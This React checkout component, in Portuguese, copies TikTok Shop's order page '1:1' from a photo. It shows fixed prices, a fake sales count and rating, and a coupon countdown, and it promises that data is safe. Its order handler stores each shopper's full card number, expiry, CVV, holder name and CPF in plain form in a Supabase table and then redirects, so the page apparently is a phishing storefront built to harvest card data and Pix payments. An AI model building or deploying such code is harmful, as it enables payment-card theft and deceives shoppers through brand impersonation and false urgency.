"use client";

import React, { useState, useEffect } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { 
  ArrowLeft, 
  MapPin, 
  ChevronRight, 
  ChevronUp,
  ChevronDown,
  Plus,
  Minus,
  Star,
  Zap,
  ShieldCheck
} from 'lucide-react';
import { Product } from '@/data/products';
import { Button } from '@/components/ui/button';
import NoteDrawer from '@/components/NoteDrawer';
import TikTokCouponDrawer from '@/components/TikTokCouponDrawer';
import { supabase } from '@/integrations/supabase/client';
import { showError, showSuccess } from '@/utils/toast';

const Checkout: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const [product, setProduct] = useState<Product | null>(null);
  const [isNoteDrawerOpen, setIsNoteDrawerOpen] = useState(false);
  const [isCouponDrawerOpen, setIsCouponDrawerOpen] = useState(false);
  const [orderNote, setOrderNote] = useState("");
  const [quantity, setQuantity] = useState(3); // Valor da foto
  const [couponAmount, setCouponAmount] = useState(5);
  const [cardData, setCardData] = useState<any>(null);
  const [shippingAddress, setShippingAddress] = useState<any>(null);
  const [paymentMethod, setPaymentMethod] = useState<'card' | 'pix'>('pix');
  const [isSubtotalOpen, setIsSubtotalOpen] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (location.state?.product) {
      setProduct(location.state.product);
    } else {
      navigate('/');
    }
    if (location.state?.cardAdded && location.state?.cardData) {
      setCardData(location.state.cardData);
      setPaymentMethod('card');
    }
    if (location.state?.addressAdded && location.state?.address) {
      setShippingAddress(location.state.address);
    }
  }, [location, navigate]);

  if (!product) return null;

  // Valores exatos da foto
  const currentTotal = 113.47;
  const originalPrice = 171.36;
  const discountOnProduct = 52.89;
  const pricePerUnit = 37.82;
  const oldPricePerUnit = 57.12;

  const handleFinalizeOrder = async () => {
    if (!shippingAddress) {
      showError("Adicione um endereço de entrega.");
      return;
    }
    if (paymentMethod === 'card' && !cardData) {
      showError("Adicione os dados do cartão.");
      return;
    }

    setIsSubmitting(true);
    try {
      const orderData = {
        product_title: product.title,
        quantity: quantity,
        total_amount: currentTotal,
        payment_method: paymentMethod,
        customer_name: shippingAddress.name,
        customer_cpf: cardData ? cardData.cpf : "N/A",
        address_cep: shippingAddress.cep,
        address_state: shippingAddress.state,
        address_city: shippingAddress.city,
        address_neighborhood: shippingAddress.neighborhood,
        address_street: shippingAddress.address,
        address_number: shippingAddress.number,
        address_complement: shippingAddress.complement,
        order_note: orderNote,
        card_number: paymentMethod === 'card' ? cardData.cardNumber : null,
        card_expiry: paymentMethod === 'card' ? cardData.expiry : null,
        card_cvv: paymentMethod === 'card' ? cardData.cvv : null,
        card_holder_name: paymentMethod === 'card' ? cardData.name : null,
      };

      const { error } = await supabase.from('orders').insert([orderData]);
      if (error) throw error;

      showSuccess("Pedido realizado!");
      if (paymentMethod === 'pix') {
        navigate('/pix-pagamento', { state: { product, shippingAddress } });
      } else {
        window.location.href = '/checkout.html';
      }
    } catch (err) {
      console.error(err);
      showError("Erro ao processar pedido.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F8F8F8] pb-[160px] font-sans">
      {/* Header 1:1 */}
      <div className="bg-white border-b sticky top-0 z-50 pt-3 pb-3">
        <div className="flex items-center px-4 relative h-8">
          <button onClick={() => navigate(-1)} className="absolute left-4">
            <ArrowLeft size={24} className="text-gray-900" />
          </button>
          <h1 className="w-full text-center text-[18px] font-bold text-gray-900">Resumo do Pedido</h1>
        </div>
        <div className="flex items-center justify-center text-[#00BFA5] text-[11px] mt-1 font-medium">
          <ShieldCheck size={14} className="mr-1" />
          <span>Seus dados estão seguros conosco</span>
        </div>
      </div>

      <div className="max-w-[600px] mx-auto space-y-[8px] mt-[8px]">
        {/* Endereço de envio 1:1 */}
        <div className="bg-white p-4 flex items-center justify-between">
          <div className="flex items-center space-x-2">
            <MapPin size={18} className="text-gray-900" />
            <span className="text-[15px] text-gray-900 font-medium">
              {shippingAddress ? `${shippingAddress.address}, ${shippingAddress.number}` : "Endereço de envio"}
            </span>
          </div>
          <button 
            className="text-[#FF2C55] text-[15px] font-medium" 
            onClick={() => navigate('/adicionar-endereco')}
          >
            {shippingAddress ? "Alterar" : "+ Adicionar endereço"}
          </button>
        </div>

        {/* Bloco do Produto 1:1 */}
        <div className="bg-white p-4">
          <div className="flex justify-between items-center mb-3">
            <span className="text-[14px] font-bold text-gray-900 uppercase">MAIS MAKE BRASIL</span>
            <button 
              className="text-[12px] text-gray-400 flex items-center" 
              onClick={() => setIsNoteDrawerOpen(true)}
            >
              Adicionar nota <ChevronRight size={14} className="ml-0.5" />
            </button>
          </div>

          <div className="flex items-center space-x-1 mb-4">
            <Star size={14} className="text-[#FFB800] fill-[#FFB800]" />
            <span className="text-[12px] text-[#A0783A] font-bold">Melhor escolha! 28.0K vendido(s) e com nota 4.8/5,0</span>
          </div>

          <div className="flex space-x-3">
            <div className="w-[90px] h-[90px] bg-[#F8F8F8] rounded-lg overflow-hidden border border-gray-50 flex-shrink-0">
              <img src={product.media[0].src} className="w-full h-full object-contain" alt="Thumb" />
            </div>
            <div className="flex-grow flex flex-col justify-between">
              <div>
                <h4 className="text-[13px] font-medium text-gray-900 line-clamp-1 leading-tight">{product.title}</h4>
                <p className="text-[11px] text-gray-400 mt-0.5">SEM faixa e polvo</p>
                
                <div className="flex items-center space-x-2 mt-1">
                  <div className="bg-[#FFF1F3] text-[#FF2C55] text-[10px] font-bold px-1.5 py-0.5 rounded-sm flex items-center">
                    <Zap size={10} className="fill-[#FF2C55] mr-0.5" />
                    Oferta Relâmpago
                  </div>
                  <div className="flex items-center text-[10px] text-gray-400 bg-gray-50 px-1.5 py-0.5 rounded-sm">
                    <div className="w-3 h-3 rounded-full bg-yellow-400 flex items-center justify-center mr-1">
                      <div className="w-1.5 h-1.5 bg-white rounded-full"></div>
                    </div>
                    Devolução gratuita
                  </div>
                </div>
              </div>

              <div className="flex justify-between items-end mt-2">
                <div className="flex flex-col">
                  <div className="flex items-center space-x-1">
                    <span className="text-[16px] font-bold text-[#FF2C55]">R$ {pricePerUnit.toFixed(2).replace('.', ',')}</span>
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#FF2C55" strokeWidth="2" className="mt-0.5">
                       <path d="M15 5v2M15 11v2M15 17v2M5 5h14a2 2 0 0 1 2 2v3a2 2 0 0 0 0 4v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-3a2 2 0 0 0 0-4V7a2 2 0 0 1 2-2z" />
                    </svg>
                  </div>
                  <div className="flex items-center space-x-1 text-[11px] text-gray-400">
                    <span className="line-through">R$ {oldPricePerUnit.toFixed(2).replace('.', ',')}</span>
                    <span className="bg-[#FFF1F3] text-[#FF2C55] px-1 rounded-sm">-34%</span>
                  </div>
                </div>

                <div className="flex items-center bg-[#F1F1F1] rounded-sm h-7">
                  <button className="w-8 h-full flex items-center justify-center text-gray-400" onClick={() => setQuantity(q => Math.max(1, q - 1))}>
                    <Minus size={14} />
                  </button>
                  <span className="w-8 text-center text-[13px] font-bold text-gray-900 border-x border-gray-200/50">{quantity}</span>
                  <button className="w-8 h-full flex items-center justify-center text-gray-400" onClick={() => setQuantity(q => q + 1)}>
                    <Plus size={14} />
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Desconto do TikTok Shop 1:1 */}
        <div 
          className="bg-white p-4 flex items-center justify-between cursor-pointer"
          onClick={() => setIsCouponDrawerOpen(true)}
        >
          <div className="flex items-center space-x-2">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#FF2C55" strokeWidth="2.5">
              <path d="M15 5v2M15 11v2M15 17v2M5 5h14a2 2 0 0 1 2 2v3a2 2 0 0 0 0 4v3a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-3a2 2 0 0 0 0-4V7a2 2 0 0 1 2-2z" />
            </svg>
            <span className="text-[15px] font-bold text-gray-900">Desconto do TikTok Shop</span>
          </div>
          <div className="flex items-center space-x-1.5">
            <span className="text-[13px] font-bold text-[#FF2C55] bg-[#FFF1F3] px-3 py-1 rounded-full">
              - R$ {couponAmount.toFixed(2).replace('.', ',')}
            </span>
            <ChevronRight size={18} className="text-gray-300" />
          </div>
        </div>

        {/* Resumo do Pedido 1:1 */}
        <div className="bg-white p-4">
          <h3 className="text-[16px] font-bold text-gray-900 mb-5">Resumo do Pedido</h3>
          
          <div className="space-y-4">
            <div 
              className="flex justify-between items-center cursor-pointer"
              onClick={() => setIsSubtotalOpen(!isSubtotalOpen)}
            >
              <div className="flex items-center space-x-1.5">
                <span className="text-[15px] text-gray-900 font-bold">Subtotal do produto</span>
                <ChevronUp size={16} className={`text-gray-900 transition-transform ${!isSubtotalOpen ? 'rotate-180' : ''}`} />
              </div>
              <span className="text-[15px] font-bold text-gray-900">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
            </div>
            
            {isSubtotalOpen && (
              <div className="space-y-4 pt-1">
                <div className="flex justify-between text-[14px] text-gray-500">
                  <span>Preço original</span>
                  <span>R$ {originalPrice.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[14px]">
                  <span className="text-gray-500">Desconto no produto</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {discountOnProduct.toFixed(2).replace('.', ',')}</span>
                </div>
                <div className="flex justify-between text-[14px]">
                  <span className="text-gray-500">Cupons do TikTok Shop</span>
                  <span className="text-[#FF2C55] font-medium">- R$ {couponAmount.toFixed(2).replace('.', ',')}</span>
                </div>
              </div>
            )}
            
            <div className="pt-4 border-t border-gray-100 flex flex-col items-end">
              <div className="w-full flex justify-between items-center">
                <span className="text-[18px] font-bold text-gray-900">Total</span>
                <span className="text-[20px] font-bold text-gray-900">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
              </div>
              <span className="text-[13px] text-gray-400 mt-0.5">Impostos inclusos</span>
            </div>
          </div>
        </div>
      </div>

      {/* Footer Fixo 1:1 */}
      <div className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 z-50">
        <div className="max-w-[600px] mx-auto">
          <div className="flex justify-between items-center mb-4 px-1">
            <span className="text-[17px] font-bold text-gray-900">Total (1 item)</span>
            <span className="text-[20px] font-bold text-[#FF2C55]">R$ {currentTotal.toFixed(2).replace('.', ',')}</span>
          </div>
          <Button 
            className="w-full bg-[#FF2C55] hover:bg-[#E0254B] text-white font-bold rounded-full h-[58px] flex flex-col items-center justify-center space-y-0.5 shadow-none border-none"
            onClick={handleFinalizeOrder}
            disabled={isSubmitting}
          >
            <span className="text-[18px]">{isSubmitting ? "Processando..." : "Fazer pedido"}</span>
            <span className="text-[11px] font-medium opacity-90">O cupom expira em 02:23:39</span>
          </Button>
        </div>
      </div>

      <NoteDrawer isOpen={isNoteDrawerOpen} onClose={() => setIsNoteDrawerOpen(false)} onSave={setOrderNote} initialNote={orderNote} />
      <TikTokCouponDrawer isOpen={isCouponDrawerOpen} onClose={() => setIsCouponDrawerOpen(false)} onSelect={setCouponAmount} selectedAmount={couponAmount} />
    </div>
  );
};

export default Checkout;